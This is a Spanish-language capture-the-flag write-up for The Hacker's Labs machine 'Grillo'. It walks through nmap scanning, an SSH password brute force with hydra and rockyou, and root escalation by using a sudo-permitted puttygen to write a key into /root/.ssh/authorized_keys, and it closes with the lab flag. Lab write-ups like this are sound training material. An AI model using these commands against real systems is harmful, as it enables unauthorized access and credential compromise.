---
title: "The Hacker's Labs - Grillo"
description: "Explotación básica de servicios, fuerza bruta SSH y escalada de privilegios vía puttygen."
publishDate: 2025-08-05
category: "ctf"
type: "post"
difficulty: "easy"
tags: ["thehackerslabs", "ssh", "puttygen", "fuerza-bruta", "linux"]
readingTime: "6 min"

----


## Información del Challenge

* **Nombre**: Grillo
* **Plataforma**: [The Hacker’s Labs](https://labs.thehackerslabs.com/machine/43)
* **Dificultad**: Principiante
* **Creadores**: CuriosidadesDeHackers, Condor
* **IP Asignada**: 192.168.10.129
* **Sistema Operativo**: Linux

## Análisis técnico

Escaneo de puertos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv 192.168.10.129 -oG grillo
```

Resultado:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Escaneo detallado:

```bash
sudo nmap -p22,80 -sCV 192.168.10.129 -oG grillo-ports
```

Resultado:

```
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
```

En el puerto 80 se muestra la página por defecto de Apache. En el pie de página encontramos un comentario HTML con el nombre de usuario: `melanie`.

## Desarrollo de la solución

### Fuerza Bruta SSH

Se utiliza `hydra` con la lista `rockyou.txt`:

```bash
hydra -l melanie -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.129
```

Resultado:

```
[22][ssh] host: 192.168.10.129   login: melanie   password: trustno1
```

### Acceso SSH

```bash
ssh melanie@192.168.10.129
```

Listamos el contenido del directorio personal:

```bash
melanie@grillo:~$ ls
user.txt
```

### Escalada de privilegios

Verificamos los comandos `sudo` disponibles:

```bash
sudo -l
```

Resultado:

```
User melanie may run the following commands on grillo:
    (root) NOPASSWD: /usr/bin/puttygen
```

Generamos una clave privada RSA:

```bash
puttygen -t rsa -o id_rsa -O private-openssh
chmod 600 id_rsa
```

Creamos la clave pública y la colocamos como autorizada para root:

```bash
sudo /usr/bin/puttygen id_rsa -o /root/.ssh/authorized_keys -O public-openssh
```

Nos conectamos como root:

```bash
ssh -i id_rsa root@192.168.10.129
```

Accedemos a la flag:

```bash
root@grillo:~# ls
root.txt
```

## Flag

```
THL{PuTTY_is_not_always_windows_only}
```

## Lecciones aprendidas

* Buscar comentarios ocultos en sitios web simples.
* Utilizar herramientas de fuerza bruta como Hydra con listas adecuadas.
* Explotar binarios con privilegios sudo para manipular claves SSH.

## Referencias

* [Hydra](https://github.com/vanhauser-thc/thc-hydra)
* [Puttygen en Linux](https://linux.die.net/man/1/puttygen)
* [Página del reto](https://labs.thehackerslabs.com/machine/43)
